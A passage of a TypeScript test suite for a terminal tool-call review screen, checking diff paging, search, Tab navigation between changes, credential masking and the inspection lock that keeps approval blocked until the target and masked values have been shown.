    const card = initialToolReview('approval', 'call', createReviewDocument(big()));
    const plain = toolReviewPage(card, 80, 24);
    for (const chrome of [0, 3, 12, 30])
      expect(toolReviewPage(card, 80, 24, chrome)).toEqual(plain);
    expect(must(toolReviewPage(full(), 80, 24, 3), 'page').rowLimit).not.toBe(
      must(toolReviewPage(full(), 80, 24, 30), 'page').rowLimit,
    );
  });

  it('draws each unchanged line once: no before copy, and the position counts the listing', () => {
    const state = full();
    const document = documentOf(state);
    const listed = listingOf(document).length;
    const page = drawnPage(state);
    expect(page.labels.some((label) => label.startsWith('=before'))).toBe(false);
    expect(page.labels.slice(0, 3)).toEqual(['target', '=1', '=2']);
    expect(page.position).toEqual({ above: 0, below: listed - page.rows.length, total: listed });
    const raw = projectReviewPage(document, REVIEW_START, 78, page.rowLimit);
    expect(raw.labels.slice(0, 4), 'the raw listing draws every unchanged line twice').toEqual([
      'target',
      '=before 1',
      '=1',
      '=before 2',
    ]);
  });
});

describe('the deduplicated listing loses nothing a person must inspect (ADR-0134 §2)', () => {
  const SECRET = 'url = https://svc?password=P@ss';
  /** 80 lines; line 20 — an UNCHANGED line — holds a credential on both sides, and line 60 is the one change. */
  const withSecret = () =>
    editedLines(
      Array.from({ length: 80 }, (_, index) => (index === 19 ? SECRET : `line ${index + 1}`)),
      { 60: 'sixty' },
    );

  it('keeps the before copy of an unchanged line that a mask touches listed, and skips the plain ones', () => {
    const document = createReviewDocument(withSecret());
    const masked = must(
      document.lines.find((line) => line.label === '=before 20'),
      'the masked before copy',
    );
    expect(masked.fullSkip).toBe(false);
    expect(document.lines.find((line) => line.label === '=before 19')?.fullSkip).toBe(true);
    expect(document.lines.find((line) => line.label === '=before 21')?.fullSkip).toBe(true);
    // The fixture's claim: a flagged credential on each side of the unchanged line — and the before side's is OWED.
    expect(document.masks).toHaveLength(2);
    expect(document.masks.every((mask) => mask.flagged)).toBe(true);
    expect(document.required.some((range) => range.field === masked.field)).toBe(true);
  });

  /** Reveal (or not) and page the whole full view from the top, acknowledging each page as the host does. */
  const walk = (reveal: boolean) => {
    const start = initialToolReview('approval', 'call', createReviewDocument(withSecret()));
    const opened = reduceToolReviewKey(
      start,
      'v',
      {},
      true,
      toolReviewPage(start, 80, 24),
      true,
      0,
    );
    if (opened.kind !== 'state') throw new Error('expected the full view');
    let state = opened.state;
    if (reveal) state = stateAfter(state, 'r');
    state = stateAfter(state, '', HOME);
    const log: { labels: readonly string[]; inspected: boolean }[] = [];
    for (let guard = 0; guard < 30; guard++) {
      const page = drawnPage(state);
      state = acknowledgeToolReview(state, page);
      log.push({ labels: page.labels, inspected: reviewInspected(state) });
      if (page.next === undefined) break;
      const action = pressFull(state, '', PGDN);
      if (action.kind !== 'state') break;
      state = action.state;
    }
    return { state, log };
  };

  it('lets the person reveal, page over the full view and reach reviewInspected — on the page that holds both copies', () => {
    const { state, log } = walk(true);
    expect(log.length, 'the credential is not on the first page').toBeGreaterThan(1);
    expect(log[0]?.inspected).toBe(false);
    const flip = log.findIndex((entry) => entry.inspected);
    expect(flip).toBeGreaterThan(0);
    // Inspection became true on the first page that drew the before copy — and that page draws its twin as well.
    expect(log.findIndex((entry) => entry.labels.includes('=before 20'))).toBe(flip);
    expect(log[flip]?.labels).toEqual(expect.arrayContaining(['=before 20', '=20']));
    expect(log.slice(0, flip).every((entry) => !entry.inspected)).toBe(true);
    expect(inspectionPending(state)).toEqual({ target: false, masks: 0 });
    // The plain before copies were never listed.
    expect(log.every((entry) => !entry.labels.includes('=before 19'))).toBe(true);
  });

  it('does not reach it by paging alone: the masks are owed until they are revealed', () => {
    const { state, log } = walk(false);
    expect(log.every((entry) => !entry.inspected)).toBe(true);
    expect(inspectionPending(state)).toEqual({ target: false, masks: 2 });
  });
});

describe('leaving the full view takes its modes with it', () => {
  const preview = replacement('a\nb\n', 'a\nB\n');

  it('`b` from an approval full view returns to the card with reveal and the code-point view off', () => {
    const state = fullViewOf(preview, { reveal: true, numeric: true });
    const back = stateAfter(state, 'b');
    expect(back.screen).toBe('card');
    expect(back.reveal).toBe(false);
    // The card has no `[p]` key and no indicator: a code-point view carried onto it could not be told from a broken screen.
    expect(back.numeric).toBe(false);
  });

  it('`b` from a details view returns to the list with the code-point view off', () => {
    const state: ToolReviewState = {
      ...initialToolReview('details', 'call', createReviewDocument(preview)),
      numeric: true,
      reveal: true,
    };
    const back = stateAfter(state, 'b');
    expect(back.screen).toBe('list');
    expect(back.numeric).toBe(false);
    expect(back.reveal).toBe(false);
  });
});

// A search runs over the document's source lines, and an unchanged line exists twice there: its `=before N` copy and its `=N`
// twin. The full view lists only the twin (`fullSkip`), so a match must be found on a line the page can draw — a cursor left on
// the skipped copy puts the match off the page, and the first Down then appears to do nothing (it steps onto the line already
// shown). Masked before copies stay listed (ADR-0134 §2), so they stay findable.
describe('a search lands on a line the full view lists (ADR-0134 §2)', () => {
  const search = (state: ToolReviewState, query: string): ToolReviewState => {
    const action = reduceToolReviewKey(
      { ...state, searching: true, query },
      '',
      { return: true },
      true,
      undefined,
      false,
      0,
    );
    if (action.kind !== 'state') throw new Error(`the search gave ${action.kind}`);
    return action.state;
  };
  /** The page the full view draws at `cursor`: deduplicated, as the host's is. */
  const drawnAt = (state: ToolReviewState, cursor: ReviewCursor): ReviewPage =>
    projectReviewPage(documentOf(state), cursor, 78, 20, state.reveal, state.numeric, false, true);
  const lineAt = (state: ToolReviewState) =>
    must(documentOf(state).lines[state.cursor.line], 'line');

  it('puts a short unchanged line’s match on the twin that is listed, and the first Down then scrolls the page', () => {
    const state = fullViewOf(editedFilePreview(60, { 10: 'ten' }));
    const found = search(state, 'line 3');
    expect(found.message).toBe('Match found');
    expect(lineAt(found).label, 'not the skipped `=before 3` copy').toBe('=3');
    expect(lineAt(found).fullSkip).not.toBe(true);
    expect(drawnAt(found, found.cursor).rows[0]).toBe('=3 line 3');
    // The match is the top row; the next Down moves the page, so the next line is.
    expect(drawnPage(stateAfter(found, '', DOWN)).rows[0]).toBe('=4 line 4');
  });

  it('puts the match of a ~2,000-character unchanged line on the twin, inside the drawn page', () => {
    const lines = Array.from({ length: 60 }, (_, index) =>
      index === 44 ? `${'x'.repeat(1000)}NEEDLE-I${'y'.repeat(1000)}` : `line ${index + 1}`,
    );
    const state = fullViewOf(editedLines(lines, { 10: 'ten' }));
    const found = search(state, 'NEEDLE-I');
    const line = lineAt(found);
    expect(line.label).toBe('=45');
    expect(line.fullSkip).not.toBe(true);
    expect(found.cursor.offset, 'the match is a thousand characters into the line').toBe(
      line.start + 1000,
    );
    expect(drawnAt(found, found.cursor).rows[0], 'the needle is the first thing drawn').toMatch(
      /^=45 NEEDLE-I/u,
    );
    // The next Down leaves the long line for the next listed one, and the page shows it.
    expect(drawnPage(stateAfter(found, '', DOWN)).rows[0]).toBe('=46 line 46');
  });

  it('finds each later match in turn, always on a listed line', () => {
    let state = fullViewOf(editedFilePreview(60, { 10: 'ten' }));
    const labels: string[] = [];
    for (let match = 0; match < 3; match++) {
      state = search(state, 'line 3');
      expect(lineAt(state).fullSkip).not.toBe(true);
      labels.push(lineAt(state).label);
      // Step past it, as a person does, and ask again.
      state = stateAfter(state, '', DOWN);
    }
    expect(labels).toEqual(['=3', '=30', '=31']);
  });

  it('keeps finding a masked line where it is listed: the masked before copy of an unchanged line', () => {
    const lines = Array.from({ length: 60 }, (_, index) =>
      index === 19 ? 'url = https://svc?password=P@ss' : `line ${index + 1}`,
    );
    const state = fullViewOf(editedLines(lines, { 50: 'fifty' }));
    // Revealed: the text is searchable, and the first place it is listed is the masked before copy (its twin follows it).
    const revealed = search({ ...state, reveal: true }, 'password');
    expect(lineAt(revealed).label).toBe('=before 20');
    expect(lineAt(revealed).fullSkip).toBe(false);
    // Masked: a hit inside a mask is not a hit, and it is not told apart from no hit.
    const hidden = search(state, 'password');
    expect(hidden.message).toBe('No later visible match');
    expect(hidden.cursor).toEqual(state.cursor);
  });
});

// `inspectionPending` answers "has this range been drawn" for every required range. `acknowledgeToolReview` keeps the list
// merged and sorted, and the answer is then a binary search; a list in any other shape is scanned. Both must give what the
// one-line definition gives: a required range is seen when ONE inspected range of its field contains it.
describe('inspectionPending agrees with the plain definition for any inspected list (ADR-0134 §3)', () => {
  interface Range {
    field: number;
    start: number;
    end: number;
  }
  /** A deterministic generator (mulberry32), so a failure names its seed. */
  const generator = (seed: number) => {
    let state = seed;
    return (below: number): number => {
      state = (state + 0x6d2b79f5) | 0;
      let t = Math.imul(state ^ (state >>> 15), 1 | state);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return Math.floor((((t ^ (t >>> 14)) >>> 0) / 4294967296) * below);
    };
  };
  const covers = (inspected: readonly Range[], required: Range): boolean =>
    inspected.some(
      (range) =>
        range.field === required.field &&
        range.start <= required.start &&
        range.end >= required.end,
    );
  /** What `acknowledgeToolReview` leaves: sorted by field and start, overlapping or touching ranges merged. */
  const merged = (ranges: readonly Range[]): Range[] => {
    const result: Range[] = [];
    for (const range of [...ranges].sort(
      (a, b) => a.field - b.field || a.start - b.start || a.end - b.end,
    )) {
      const last = result.at(-1);
      if (last?.field === range.field && range.start <= last.end)
        result[result.length - 1] = { ...last, end: Math.max(last.end, range.end) };
      else result.push({ ...range });
    }
    return result;
  };
  const base = () => fullViewOf(editedFilePreview(8, { 4: 'four' }));
  const stateWith = (
    required: readonly Range[],
    inspected: readonly Range[],
    requiredTarget?: Range,
  ): ToolReviewState => ({
    ...base(),
    document: { ...documentOf(base()), required },
    inspected,
    requiredTarget,
  });
  const expectedPending = (
    required: readonly Range[],
    inspected: readonly Range[],
    target?: Range,
  ) => ({
    target: target !== undefined && !covers(inspected, target),
    masks: required.filter((range) => !covers(inspected, range)).length,
  });
  /** Required ranges that sit exactly on, just inside and just past the ends of every inspected range. */
  const edges = (inspected: readonly Range[]): Range[] =>
    inspected.flatMap(({ field, start, end }) => [
      { field, start, end },
      { field, start, end: end + 1 },
      { field, start: start - 1, end },
      { field, start: end, end: end + 1 },
      { field, start: start - 1, end: start },
      { field, start: start + 1, end },
      { field, start, end: start + 1 },
      { field, start: end - 1, end },
      { field: field + 1, start, end },
    ]);
  const randomRanges = (
    random: (below: number) => number,
    count: number,
    longest: number,
  ): Range[] =>
    Array.from({ length: count }, () => {
      const start = random(100);
      return { field: random(3), start, end: start + 1 + random(longest) };
    });

  it('names the ends of a range exactly: one range covering the required one, no more, no less', () => {
    const inspected = [{ field: 0, start: 10, end: 20 }];
    const pending = (required: Range) => inspectionPending(stateWith([required], inspected)).masks;
    expect(pending({ field: 0, start: 10, end: 20 }), 'the whole range').toBe(0);
    expect(pending({ field: 0, start: 15, end: 20 }), 'touching its end from inside').toBe(0);
    expect(pending({ field: 0, start: 10, end: 11 }), 'its first character').toBe(0);
    expect(pending({ field: 0, start: 20, end: 25 }), 'starting where it ends').toBe(1);
    expect(pending({ field: 0, start: 10, end: 21 }), 'one past its end').toBe(1);
    expect(pending({ field: 0, start: 9, end: 20 }), 'one before its start').toBe(1);
    expect(pending({ field: 1, start: 10, end: 20 }), 'the same offsets in another field').toBe(1);
  });

  it('does not add two inspected ranges together: a required range spanning a gap between them is owed', () => {
    const inspected = [
      { field: 0, start: 0, end: 10 },
      { field: 0, start: 12, end: 20 },
    ];
    expect(inspectionPending(stateWith([{ field: 0, start: 5, end: 15 }], inspected)).masks).toBe(
      1,
    );
    expect(inspectionPending(stateWith([{ field: 0, start: 12, end: 15 }], inspected)).masks).toBe(
      0,
    );
  });

  it('agrees with the definition for merged, sorted lists in three fields, on the edges of every range', () => {
    let covered = 0;
    let owed = 0;
    for (let seed = 1; seed <= 150; seed++) {
      const random = generator(seed);
      const inspected = merged(randomRanges(random, 1 + random(12), 18));
      const required = [...edges(inspected), ...randomRanges(random, 30, 8)];
      const target = random(2) === 0 ? undefined : randomRanges(random, 1, 8)[0];
      const state = stateWith(required, inspected, target);
      const expected = expectedPending(required, inspected, target);
      expect(inspectionPending(state), `seed ${seed}`).toEqual(expected);
      expect(reviewInspected(state), `seed ${seed}`).toBe(!expected.target && expected.masks === 0);
      covered += required.length - expected.masks;
      owed += expected.masks;
    }
    // Not vacuous: both answers were given many times.
    expect(covered).toBeGreaterThan(500);
    expect(owed).toBeGreaterThan(500);
  });

  it('agrees with the definition for lists that are not in that shape: unsorted, overlapping, nested, duplicated, touching', () => {
    let covered = 0;
    let owed = 0;
    for (let seed = 1; seed <= 150; seed++) {
      const random = generator(1000 + seed);
      const raw = randomRanges(random, 2 + random(14), 25);
      const shapes: Range[][] = [
        raw, // as generated: unsorted, overlapping, nested, duplicate
        [...raw, ...raw.slice(0, 3)], // with duplicates
        [...merged(raw)].reverse(), // sorted, then reversed
        merged(raw).flatMap((range) => [
          { ...range, end: range.start + 1 },
          { ...range, start: range.start + 1 },
        ]), // touching, never merged
      ];
      for (const inspected of shapes) {
        const required = [...edges(inspected), ...randomRanges(random, 20, 10)];
        const target = random(2) === 0 ? undefined : randomRanges(random, 1, 10)[0];
        const expected = expectedPending(required, inspected, target);
        expect(inspectionPending(stateWith(required, inspected, target)), `seed ${seed}`).toEqual(
          expected,
        );
        covered += required.length - expected.masks;
        owed += expected.masks;
      }
    }
    expect(covered).toBeGreaterThan(500);
    expect(owed).toBeGreaterThan(500);
  });

  it('answers for a hand-built list whose only fault is one pair out of order', () => {
    const inspected = [
      { field: 0, start: 0, end: 5 },
      { field: 0, start: 50, end: 60 },
      { field: 0, start: 20, end: 30 },
      { field: 1, start: 0, end: 5 },
    ];
    const required = [
      { field: 0, start: 22, end: 28 },
      { field: 0, start: 52, end: 58 },
      { field: 0, start: 1, end: 4 },
      { field: 1, start: 1, end: 4 },
      { field: 0, start: 31, end: 32 },
    ];
    expect(inspectionPending(stateWith(required, inspected))).toEqual(
      expectedPending(required, inspected),
    );
    expect(inspectionPending(stateWith(required, inspected)).masks).toBe(1);
  });

  it('applies the same definition to the target requirement, held by the state or shown by the page', () => {
    const inspected = [{ field: 0, start: 0, end: 100 }];
    const target = { field: 0, start: 0, end: 100 };
    expect(inspectionPending(stateWith([], inspected, target)).target).toBe(false);
    expect(inspectionPending(stateWith([], inspected, { ...target, end: 101 })).target).toBe(true);
    expect(inspectionPending(stateWith([], inspected), { ...target, end: 101 }).target).toBe(true);
    expect(inspectionPending(stateWith([], inspected), target).target).toBe(false);
  });
});

describe('a step down inside a long last line stays where it is (ADR-0134 §5)', () => {
  const long = () => fullViewOf(replacement(null, `${'x'.repeat(4000)}\n`));
  const inside = (): ToolReviewState => {
    const state = long();
    const line = must(documentOf(state).lines[1], 'the long line');
    return { ...state, cursor: { line: 1, offset: line.start + 500 } };
  };

  it('Down and j leave the cursor unchanged: nothing below to step onto, and no fall back to the line start', () => {
    expect(documentOf(inside()).lines).toHaveLength(2);
    expect(pressFull(inside(), '', DOWN)).toEqual({ kind: 'none' });
    expect(pressFull(inside(), 'j')).toEqual({ kind: 'none' });
  });

  it('while Up from the same place returns to the start of the line, as before', () => {
    expect(stateAfter(inside(), '', UP).cursor).toEqual({ line: 1, offset: 0 });
  });
});

describe('a chain of closely spaced edits is several changes, each of bounded length (ADR-0134 §5)', () => {
  /** An edit on every sixth line of 120: each is within the six-line gap of the next, so a gap alone would join them all. */
  const chain = () => {
    const edits: Record<number, string> = {};
    for (let line = 6; line <= 114; line += 6) edits[line] = `edit ${line}`;
    return fullViewOf(editedFilePreview(120, edits));
  };

  it('gives several changeStarts, and no change spans more than 40 listed lines', () => {
    const document = documentOf(chain());
    expect(document.changeStarts.length).toBeGreaterThanOrEqual(3);
    expect(document.changeStarts.map((index) => document.lines[index]?.label)).toEqual([
      '-6',
      '-42',
      '-78',
      '-114',
    ]);
    const lastChanged = (from: number, before: number): number => {
      let last = from;
      for (let index = from; index < before; index++)
        if (document.lines[index]?.changed === true) last = index;
      return last;
    };
    document.changeStarts.forEach((start, change) => {
      const next = document.changeStarts[change + 1] ?? document.lines.length;
      const span =
        ordinalOf(document, { line: lastChanged(start, next), offset: 0 }) -
        ordinalOf(document, { line: start, offset: 0 });
      expect(span, `change ${change}`).toBeGreaterThan(0);
      expect(span, `change ${change}`).toBeLessThanOrEqual(40);
    });
  });

  it('is reached by Tab: it keeps going past the first page, shows every changed line, and stops only with no change left below', () => {
    const state = chain();
    const document = documentOf(state);
    const walk = tabWalk(state);
    expect(labelOf(walk.landings[0]?.state ?? state), 'the opening of the first change').toBe('=3');
    expect(labelOf(walk.last), 'the last landing is the last full page').toBe('=111');
    expect(walk.landings.length, 'several pages of changes').toBeGreaterThan(4);
    // Each landing is further down than the one before: more changed lines are above its page.
    let above = -1;
    for (const landing of walk.landings) {
      const here = drawnPage(landing.state).changesAbove;
      expect(here).toBeGreaterThan(above);
      above = here;
      // And it draws the nearest changed line the walk had not yet shown.
      if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
    }
    expect(everyChangedLineSeen(walk, document), 'no changed line is stepped over').toEqual([]);
    expect(walk.refusal).toBe('No later change');
    expect(
      walk.refusedAt.changesBelow,
      '"No later change" is only said with nothing changed below',
    ).toBe(0);
    expect(
      drawnPage(chain()).changesBelow,
      'the first page leaves most changes below',
    ).toBeGreaterThan(20);
  });
});

describe('a row is measured as the one string the terminal measures (ADR-0134 §3)', () => {
  it('never draws a row wider than the page when tokens join into wider clusters', () => {
    // A digit and the combining enclosing keycap are one cluster two cells wide — not one cell plus none.
    const keycap = '1⃣';
    expect(displayWidth(keycap), 'the fixture really is wider than its parts').toBe(2);
    const value = keycap.repeat(100);
    const document = createReviewDocument({ kind: 'operation', fields: [{ name: 'v', value }] });
    let cursor = REVIEW_START;
    let drawn = 0;
    for (let pages = 0; pages < 100; pages++) {
      const page = projectReviewPage(document, cursor, 78, 5);
      expect(page.valid).toBe(true);
      for (const row of page.rows) {
        expect(displayWidth(row), row).toBeLessThanOrEqual(78);
        drawn += [...row].filter((char) => char === '⃣').length;
      }
      if (page.next === undefined) break;
      cursor = page.next;
    }
    expect(drawn, 'every cluster is on some row').toBe(100);
  });
});

describe('leaving the full view clears its message with its modes (ADR-0134 §5)', () => {
  const preview = () => editedFilePreview(60, { 10: 'ten' });
  /** The message the full view itself produces: Tab past the last change. */
  const atLastChange = (state: ToolReviewState): ToolReviewState => {
    const onChange = stateAfter(state, '', TAB);
    const refused = stateAfter(onChange, '', TAB);
    expect(refused.message, 'Tab past the last change says so').toBe('No later change');
    return refused;
  };

  it('`b` from an approval full view returns to the card with no message, reveal off and the code-point view off', () => {
    const state = atLastChange(fullViewOf(preview(), { reveal: true, numeric: true }));
    expect(state.reveal).toBe(true);
    const back = stateAfter(state, 'b');
    expect(back.screen).toBe('card');
    expect(back.message).toBe('');
    expect(back.reveal).toBe(false);
    expect(back.numeric).toBe(false);
  });

  it('`b` from a details view returns to the call list with no message, reveal off and the code-point view off', () => {
    const details: ToolReviewState = {
      ...initialToolReview('details', 'call', createReviewDocument(preview())),
      reveal: true,
      numeric: true,
    };
    const state = atLastChange(details);
    expect(state.screen).toBe('full');
    const back = stateAfter(state, 'b');
    expect(back.screen).toBe('list');
    expect(back.message).toBe('');
    expect(back.reveal).toBe(false);
    expect(back.numeric).toBe(false);
  });

  it('clears a message of any origin, not only the change-jump ones (a search result, a refusal note)', () => {
    for (const message of ['Match found', 'No later visible match', 'Masked page sent']) {
      expect(stateAfter(fullViewOf(preview(), { message }), 'b').message, message).toBe('');
      const details = initialToolReview('details', 'call', createReviewDocument(preview()));
      expect(stateAfter({ ...details, message }, 'b').message, message).toBe('');
    }
  });
});

describe('a details view opens on the first line the full view lists (ADR-0134 §6)', () => {
  /** A diff with no target and no fields: it starts with an unchanged line, so source line 0 is a skipped `=before 1` copy. */
  const bare = (): ToolPreview => {
    const { diff } = editedFilePreview(30, { 10: 'ten' });
    if (diff === undefined) throw new Error('missing diff');
    return { kind: 'operation', fields: [], diff };
  };

  it('starts on the first LISTED line, not on the skipped copy at source line 0', () => {
    const document = createReviewDocument(bare());
    expect(document.lines[0]?.label).toBe('=before 1');
    expect(document.lines[0]?.fullSkip).toBe(true);
    const state = initialToolReview('details', 'call', document);
    expect(state.screen).toBe('full');
    expect(state.cursor).toEqual(topCursor(document));
    expect(state.cursor).toEqual({ line: 1, offset: 0 });
    expect(state.cursor).not.toEqual(REVIEW_START);
  });

  it('makes the first Down visibly move the page — it used to step onto the line already at the top', () => {
    const state = initialToolReview('details', 'call', createReviewDocument(bare()));
    const before = drawnPage(state).rows[0];
    const after = drawnPage(stateAfter(state, '', DOWN)).rows[0];
    expect(before).toBe('=1 line 1');
    expect(after).toBe('=2 line 2');
    // The same page, drawn raw from the cursor, agrees on where the page starts.
    expect(
      projectReviewPage(documentOf(state), state.cursor, 78, 20, false, false, false, true).rows[0],
    ).toBe(before);
  });

  it('keeps the top where the first source line is listed already, and for an approval or no document', () => {
    const withTarget = createReviewDocument(editedFilePreview(30, { 10: 'ten' }));
    expect(initialToolReview('details', 'call', withTarget).cursor).toEqual(REVIEW_START);
    expect(initialToolReview('details', 'call').cursor).toEqual(REVIEW_START);
    // An approval opens on its card; its cursor only matters once the full view is opened, which sets it.
    expect(initialToolReview('approval', 'call', createReviewDocument(bare())).cursor).toEqual(
      REVIEW_START,
    );
  });
});

describe('reviewRequiredTarget fails closed when the target cannot be drawn (ADR-0129)', () => {
  const stateFor = (preview: ToolPreview): ToolReviewState =>
    initialToolReview('approval', 'call', createReviewDocument(preview));
  const safe = (): ToolPreview => ({ kind: 'operation', target: 'safe.txt', fields: [] });

  it('is undefined when the whole target fits the title rows', () => {
    const state = stateFor(safe());
    expect(toolReviewTarget(state, 80, 24)?.valid).toBe(true);
    expect(reviewRequiredTarget(state, 80, 24)).toBeUndefined();
  });

  it('is the whole range of the target line when the target does not fit, however short it is', () => {
    const long = stateFor({ kind: 'operation', target: 'd'.repeat(200), fields: [] });
    expect(reviewRequiredTarget(long, 80, 24)).toEqual({ field: 0, start: 0, end: 200 });
  });

  it('is the whole range of the target line when the page for it is invalid — a terminal too narrow to draw any of it', () => {
    const state = stateFor(safe());
    // The target projection gets `columns - 2 - verb` columns and needs at least 32: 40 columns leaves too few.
    expect(toolReviewTarget(state, 40, 24)?.valid).toBe(false);
    expect(reviewRequiredTarget(state, 40, 24)).toEqual({
      field: 0,
      start: 0,
      end: 'safe.txt'.length,
    });
    // The page and the lock read the same range: Allow stays locked until the target has been on screen.
    expect(toolReviewPage(state, 40, 24)?.requiredTarget).toEqual({
      field: 0,
      start: 0,
      end: 'safe.txt'.length,
    });
  });

  it('is undefined without a target, even where nothing can be drawn, and without a document', () => {
    const noTarget = stateFor({ kind: 'operation', fields: [{ name: 'a', value: 'b' }] });
    expect(reviewRequiredTarget(noTarget, 40, 24)).toBeUndefined();
    expect(reviewRequiredTarget(initialToolReview('approval', 'call'), 40, 24)).toBeUndefined();
  });
});

// The maintainer's complaint, for prose: a card or a full view that opens "three unchanged lines above the change" is three
// SCREENS above it when each line is a wrapped paragraph. Context is also counted in rows, so the change is always on the page
// it opens.
describe('a change in wrapped prose is on the page it opens on (ADR-0134 §4)', () => {
  /** `count` paragraphs of exactly `length` characters; the paragraphs in `replaced` are rewritten (same length). */
  const prose = (length: number, replaced: readonly number[] = [10], count = 20): ToolPreview => {
    const paragraph = (index: number, tag: string): string =>
      `${tag}${index} ${'lorem ipsum dolor sit amet '.repeat(40)}`.slice(0, length);
    return editedLines(
      Array.from({ length: count }, (_, index) => paragraph(index + 1, 'P')),
      Object.fromEntries(replaced.map((line) => [line, paragraph(line, 'Q')])),
    );
  };
  const cardOf = (preview: ToolPreview) => {
    const state = initialToolReview('approval', 'call', createReviewDocument(preview));
    return { state, page: must(toolReviewPage(state, 80, 24), 'the card page') };
  };
  const open = (card: ReturnType<typeof cardOf>): ToolReviewState => {
    const action = reduceToolReviewKey(card.state, 'v', {}, true, card.page, true, 0);
    if (action.kind !== 'state') throw new Error(`v gave ${action.kind}`);
    return action.state;
  };
  /** Changed lines the page draws IN FULL — its cut is not inside them — which is what it does not count as hidden. */
  const fullyDrawnChanged = (document: ReviewDocument, page: ReviewPage): number =>
    document.lines.filter(
      (line, index) =>
        line.changed &&
        page.labels.includes(line.label) &&
        (page.next === undefined || page.next.line > index),
    ).length;

  it.each([200, 250, 300, 330, 400])(
    'draws a changed row on the card, and opens the full view where its first changed row is drawn, at %i characters a paragraph',
    (length) => {
      const card = cardOf(prose(length));
      const document = documentOf(card.state);
      // The card: a changed row is on it, and the hidden count says exactly what is not.
      expect(card.page.valid).toBe(true);
      expect(
        card.page.kinds.some((kind) => kind === 'removed' || kind === 'added'),
        'a changed row is drawn',
      ).toBe(true);
      expect(card.page.hiddenChanges).toBe(
        document.changedLines - fullyDrawnChanged(document, card.page),
      );
      // The full view: `v` opens on a cursor whose page draws the first changed row, with at most a third of the page above it.
      const opened = open(card);
      expect(opened.screen).toBe('full');
      const page = drawnPage(opened);
      const firstChanged = page.labels.indexOf('-10');
      expect(firstChanged, 'the first changed row is on the page').toBeGreaterThanOrEqual(0);
      expect(page.kinds[firstChanged]).toBe('removed');
      expect(page.rows[firstChanged]?.startsWith('-10 P10 ')).toBe(true);
      expect(firstChanged, 'context rows above it are bounded').toBeLessThanOrEqual(
        Math.max(3, Math.floor(page.rowLimit / 3)),
      );
    },
  );

  it('keeps exactly three context lines above the change when the lines are short (40 characters)', () => {
    const card = cardOf(prose(40));
    expect(card.page.kinds.slice(0, 4)).toEqual(['context', 'context', 'context', 'removed']);
    expect(card.page.rows.slice(0, 3).map((row) => row.slice(0, 2))).toEqual(['=7', '=8', '=9']);
    expect(card.page.hiddenChanges).toBe(0);
    const opened = open(card);
    expect(labelOf(opened)).toBe('=7');
    expect(drawnPage(opened).labels.slice(0, 4)).toEqual(['=7', '=8', '=9', '-10']);
  });

  it('spends fewer context lines the more rows each takes: one line at 3 rows, none once a line is wider than the budget', () => {
    const contextLines = (length: number): number => {
      const labels = drawnPage(open(cardOf(prose(length)))).labels;
      const first = labels.indexOf('-10');
      expect(first, `the change is drawn at ${length} characters`).toBeGreaterThanOrEqual(0);
      return new Set(labels.slice(0, first)).size;
    };
    expect(contextLines(200), 'a three-row line fits the three-row budget once').toBe(1);
    expect(contextLines(300), 'a five-row line does not fit it').toBe(0);
    expect(contextLines(40)).toBe(3);
  });

  it('Tab lands each change on a page that draws it, too: the opening is counted in rows', () => {
    const state = fullViewOf(prose(300, [5, 15]));
    const stops: string[] = [];
    let current = state;
    for (let change = 0; change < 2; change++) {
      current = stateAfter(current, '', TAB);
      const page = drawnPage(current);
      const line = change === 0 ? '-5' : '-15';
      stops.push(line);
      expect(page.labels, `Tab ${change + 1} shows the change`).toContain(line);
      expect(page.rows[page.labels.indexOf(line)]?.startsWith(`${line} P`)).toBe(true);
    }
    expect(stops).toEqual(['-5', '-15']);
  });
});

// A change longer than a page — dense edits, lines that wrap — has more changed lines off the page than no change left to
// jump to. Tab then PAGES toward them; "No later change" is only true when none remain below.
describe('Tab pages toward the rest of a change before it says there is none (ADR-0134 §5)', () => {
  /** An edit on every sixth line: one change (the gap rule joins them), longer than a page at 80x24. */
  const dense = (width: number): ToolReviewState => {
    const lines = Array.from({ length: 40 }, (_, index) =>
      `line ${index + 1} ${'w'.repeat(width)}`.trimEnd(),
    );
    const edits: Record<number, string> = {};
    for (let line = 6; line <= 36; line += 6)
      edits[line] = `edit ${line} ${'w'.repeat(width)}`.trimEnd();
    return fullViewOf(editedLines(lines, edits));
  };

  it.each([
    ['short lines', 0],
    ['wrapped lines (two rows each)', 90],
  ])(
    'walks forward through every changed line of %s, each landing drawing the nearest one not yet seen, and answers only when none remain',
    (_name, width) => {
      const state = dense(width);
      const document = documentOf(state);
      expect(
        document.changeStarts,
        'one change: every edit is within the gap of the next',
      ).toHaveLength(1);
      const walk = tabWalk(state);
      expect(walk.landings.length, 'the change is longer than one page').toBeGreaterThanOrEqual(2);
      let previous = state;
      for (const landing of walk.landings) {
        expect(
          compareCursorsForTest(landing.state.cursor, previous.cursor),
          'strictly forward',
        ).toBeGreaterThan(0);
        // Not a line, and not past the next changed line: the landing page DRAWS the nearest changed line not yet seen.
        if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
        previous = landing.state;
      }
      expect(everyChangedLineSeen(walk, document), 'no changed line is stepped over').toEqual([]);
      expect(walk.refusal).toBe('No later change');
      expect(
        walk.refusedAt.changesBelow,
        'the answer is only given with nothing changed below',
      ).toBe(0);
      expect(walk.last.cursor, 'and the refusal moves nothing').toEqual(previous.cursor);
    },
  );

  it('never answers "No later change" at any stop of a long change while a changed line remains below', () => {
    let current = stateAfter(dense(90), '', TAB);
    for (let guard = 0; guard < 40; guard++) {
      const action = pressFull(current, '', TAB);
      if (action.kind !== 'state' || action.state.message !== '') break;
      current = action.state;
      expect(action.state.message).toBe('');
    }
    expect(drawnPage(current).changesBelow).toBe(0);
  });

  it('pages through a change that is one long line: Tab continues inside it until its end, then says there is none', () => {
    // A new file of one 4,000-character line: the only change, with nothing to jump to, and 54 rows of it.
    let current = fullViewOf(replacement(null, `${'x'.repeat(4000)}\n`), {
      cursor: { line: 1, offset: 0 },
    });
    const offsets: number[] = [];
    for (let guard = 0; guard < 40; guard++) {
      const action = pressFull(current, '', TAB);
      if (action.kind !== 'state') throw new Error(`Tab gave ${action.kind}`);
      if (action.state.message !== '') {
        expect(action.state.message).toBe('No later change');
        expect(drawnPage(current).changesBelow).toBe(0);
        break;
      }
      expect(
        drawnPage(current).changesBelow,
        'it moved, so changed text was below',
      ).toBeGreaterThan(0);
      current = action.state;
      offsets.push(current.cursor.offset);
    }
    expect(offsets.length, 'several pages of one line').toBeGreaterThanOrEqual(3);
